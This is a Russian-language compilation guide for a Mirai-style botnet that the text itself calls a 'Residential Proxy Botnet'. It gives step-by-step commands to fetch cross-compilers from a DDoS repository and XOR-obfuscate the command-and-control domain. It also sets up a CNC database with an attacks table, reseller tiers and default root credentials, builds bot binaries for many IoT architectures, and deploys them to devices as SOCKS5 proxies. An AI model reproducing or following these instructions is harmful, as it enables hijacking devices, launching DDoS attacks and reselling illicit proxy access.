# Руководство по компиляции

## Быстрый старт (Ubuntu 20.04+)

### 1. Установка зависимостей

```bash
# Обновить систему
sudo apt-get update -y
sudo apt-get upgrade -y

# Установить необходимые пакеты
sudo apt-get install -y \
    gcc g++ \
    python3 python3-pip \
    git \
    sqlite3 \
    screen

# Установить Go 1.20+
cd /tmp
wget https://dl.google.com/go/go1.20.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz

# Настроить переменные окружения
echo 'export GOROOT=/usr/local/go' >> ~/.bashrc
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH' >> ~/.bashrc
source ~/.bashrc

# Проверить установку Go
go version
```

### 2. Установка Cross-Compilers

```bash
# Создать директорию для компиляторов
sudo mkdir -p /etc/xcompile
cd /etc/xcompile

# Скачать компиляторы
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i586.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i686.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2

# Распаковать все архивы
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2

# Удалить архивы
rm -rf *.tar.*

# Переименовать директории
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-x86_64 x86_64
```

### 3. Подготовка проекта

```bash
# Перейти в директорию проекта
cd ~/botnet  # или где находится ваш проект

# Установить Go зависимости
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords
go get github.com/alexeyco/simpletable
```

### 4. Настройка домена CNC

```bash
# Скомпилировать XOR утилиту
cd tools
gcc xor.c -o xor

# Сгенерировать XOR строку для вашего домена
./xor string your-cnc-domain.com

# Скопировать вывод и добавить в bot/table.c
# Найти функцию table_init() и добавить:
# add_entry(TABLE_CNC_DOMAIN, "\xВАШ_XOR_ВЫВОД", ДЛИНА);
```

Пример в `bot/table.c`:
```c
void table_init(void)
{
    // ... существующий код ...
    
    // Добавить ваш домен
    add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0", 6);
    
    table_unlock_val(TABLE_CNC_DOMAIN);
}
```

### 5. Инициализация базы данных

```bash
cd assets

# Запустить SQLite
sqlite3 data.sql

# Выполнить следующие команды в SQLite:
```

```sql
CREATE TABLE `users` (
    `id` INTEGER PRIMARY KEY AUTOINCREMENT,
    `username` TEXT NOT NULL,
    `password` TEXT NOT NULL,
    `admin` INTEGER NOT NULL,
    `reseller` INTEGER NOT NULL,
    `newuser` INTEGER NOT NULL,
    `api` INTEGER NOT NULL,
    `maxtime` INTEGER NOT NULL,
    `cooldown` INTEGER NOT NULL,
    `conns` INTEGER NOT NULL,
    `max_daily` INTEGER NOT NULL,
    `expiry` INTEGER NOT NULL
);

INSERT INTO users VALUES(
    1,
    'root',
    'root@123',
    1,  -- admin
    1,  -- reseller
    0,  -- newuser
    0,  -- api
    864000,  -- maxtime (10 дней в секундах)
    0,  -- cooldown
    3,  -- conns
    100,  -- max_daily
    1790903892  -- expiry (далекое будущее)
);

CREATE TABLE `attacks` (
    `target` TEXT NOT NULL,
    `duration` INTEGER NOT NULL,
    `flags` TEXT NOT NULL,
    `sent` INTEGER NOT NULL,
    `finish` INTEGER NOT NULL,
    `user` TEXT NOT NULL,
    `devices` INTEGER NOT NULL
);

-- Проверить таблицы
.tables

-- Выйти
.quit
```

### 6. Компиляция ботов

```bash
# Вернуться в корень проекта
cd ~/botnet

# Дать права на выполнение
chmod +x build.sh

# Запустить компиляцию
./build.sh
```

Это создаст бинарники в `./release/`:
- debug.dbg (для отладки)
- main_x86, main_x86_64
- main_mips, main_mpsl
- main_arm, main_arm5, main_arm6, main_arm7
- main_ppc, main_m68k, main_sh4, main_spc

### 7. Компиляция CNC сервера

```bash
# В корне проекта
go build cnc/*.go

# Или явно указать выходной файл
go build -o cnc_server cnc/*.go
```

### 8. Запуск CNC сервера

```bash
# Опционально: настроить server.toml
nano assets/server.toml

# Запустить в screen сессии
screen -S cnc
./admin  # или ./cnc_server

# Отключиться от screen: Ctrl+A, затем D
# Вернуться: screen -r cnc
```

### 9. Подключение к CNC

```bash
# С локального сервера
telnet localhost 23

# С удаленного сервера
telnet your-server-ip 23

# Логин:
# username: root
# password: root@123
```

## Дебаг режим

Для отладки можно скомпилировать с DEBUG флагом:

```bash
# Изменить в build.sh для одной архитектуры:
function compile_bot_debug {
    "$1-gcc" -std=c99 -DDEBUG $3 bot/*.c -O0 -g -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

# Скомпилировать
compile_bot_debug i586 debug.dbg "-static"

# Запустить
./release/debug.dbg
```

## Структура после компиляции

```
botnet/
├── release/              # Скомпилированные боты
│   ├── debug.dbg
│   ├── main_x86
│   ├── main_x86_64
│   └── ...
├── admin или cnc_server  # CNC сервер
├── assets/
│   ├── data.sql          # База данных
│   └── server.toml       # Конфигурация
└── ...
```

## Возможные проблемы

### 1. "gcc: command not found"
```bash
sudo apt-get install gcc g++
```

### 2. "Go not found"
```bash
# Проверить путь
which go
echo $GOROOT
echo $GOPATH

# Переустановить если нужно
source ~/.bashrc
```

### 3. "cross-compiler not found"
```bash
# Проверить что компиляторы установлены
ls -la /etc/xcompile/

# Проверить что они в PATH
export PATH=$PATH:/etc/xcompile/armv4l/bin
# ... для каждой архитектуры
```

### 4. "cannot open database file"
```bash
# Создать директорию assets если её нет
mkdir -p assets
cd assets

# Создать базу заново
sqlite3 data.sql < ../schema.sql  # если есть schema.sql
# или вручную через sqlite3
```

### 5. Ошибки линковки при компиляции
```bash
# Установить missing libraries
sudo apt-get install libc6-dev

# Использовать статическую линковку
# (уже добавлено в build.sh с флагом -static)
```

## Тестирование

### Тест локально (x86_64)

```bash
# Запустить debug версию
./release/debug.dbg

# В другом терминале проверить прокси
curl -x socks5://127.0.0.1:1080 https://api.ipify.org
```

### Тест на целевом устройстве

```bash
# Скопировать бинарник на устройство (например ARM)
scp release/main_arm user@device_ip:/tmp/

# На устройстве
ssh user@device_ip
cd /tmp
chmod +x main_arm
./main_arm

# С вашего компьютера
curl -x socks5://device_ip:1080 https://api.ipify.org
```

## Автоматизация сборки

Создать скрипт `build_all.sh`:

```bash
#!/bin/bash
set -e

echo "=== Building Residential Proxy Botnet ==="

# 1. Clean
echo "[1/5] Cleaning..."
rm -rf ./release
mkdir -p ./release

# 2. Build XOR tool
echo "[2/5] Building XOR tool..."
gcc tools/xor.c -o tools/xor

# 3. Build bots
echo "[3/5] Building bots..."
./build.sh

# 4. Build CNC
echo "[4/5] Building CNC server..."
go build -o admin cnc/*.go

# 5. Summary
echo "[5/5] Summary:"
echo "Bots compiled: $(ls -1 release/ | wc -l)"
echo "CNC server: admin"
echo ""
echo "Done! ✓"
```

```bash
chmod +x build_all.sh
./build_all.sh
```
